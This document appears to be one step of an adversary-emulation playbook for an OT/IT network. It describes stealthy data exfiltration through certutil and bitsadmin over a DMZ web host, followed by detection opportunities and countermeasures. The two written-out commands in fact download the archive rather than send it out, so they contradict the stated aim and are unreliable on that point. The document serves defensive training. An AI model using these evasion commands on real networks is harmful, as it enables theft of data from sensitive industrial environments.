# Step 8: Exfiltration

**Objective**:  
Stealthily exfiltrate sensitive data from the environment using native Windows binaries over existing tunnels to avoid detection.

---

## Context

- Target environment includes OT and IT subnets with strict monitoring.
- Target files already compressed with makecab and staged on OT host
- Data exfiltration occurs via web services accessible through a DMZ webserver (`dmz-web-elcoop-01`) and the ENG subnet.
- Leverage LOLBAS (Living Off the Land Binaries and Scripts) tools such as `certutil` and `bitsadmin` to blend with legitimate activity.

---

## Execution

### 1. Exfiltrate Data Using Native Tools  
Use built-in Windows utilities to transfer data out via the established tunnel:

- **Certutil**  
  Upload or download files by encoding or decoding content through HTTPS or HTTP channels stealthily.
  
```
certutil -urlcache -split -f "http://dmz-web-elcoop-01/archive.cab" C:\Users\Public\archive.cab

```
  
- **Bitsadmin**  
  Initiate a background intelligent transfer job to download or upload files over HTTP/HTTPS, minimizing network noise.

Example command to download an exfiltration archive:
```
bitsadmin /transfer job /download http://dmz-web-elcoop-01/archive.cab C:\Users\Public\archive.cab
```

---

## Result

- Data is successfully transmitted out of the environment with minimal network footprint

- Processes appear as normal system activity using signed Windows binaries

- Exfiltration avoids triggering common alerts focused on unknown or third-party tools

---

## Detection Opportunities

| **Event**                          | **Description**                                                                                 |
|-----------------------------------|------------------------------------------------------------------------------------------------|
| Unusual `certutil.exe` activity   | Detect certutil downloading or uploading files from/to suspicious external URLs.               |
| Suspicious `bitsadmin.exe` usage  | Monitor bitsadmin jobs transferring data to uncommon or unexpected HTTP/HTTPS destinations.    |
| Outbound data spikes              | Identify abnormal outbound data volumes from OT/IT subnets, indicating potential exfiltration. |
| Process and network correlation   | Alerts when LOLBAS tools are executed alongside network connections to external, suspicious hosts. |
| Network anomaly detection (NDR)   | Detect deviations in protocol use, data size, or destination reputation indicative of data theft. |
| Data Loss Prevention (DLP) alerts | Trigger on unauthorized sensitive data leaving the environment via web protocols or tunnels.    |

---

## Defensive Countermeasures
- Restrict and monitor usage of high-risk LOLBAS tools (certutil, bitsadmin) especially on sensitive hosts
- Employ application whitelisting to prevent unauthorized execution of binaries used in exfiltration
- Implement comprehensive network monitoring for anomalies in protocol usage, data volume, and destination reputation
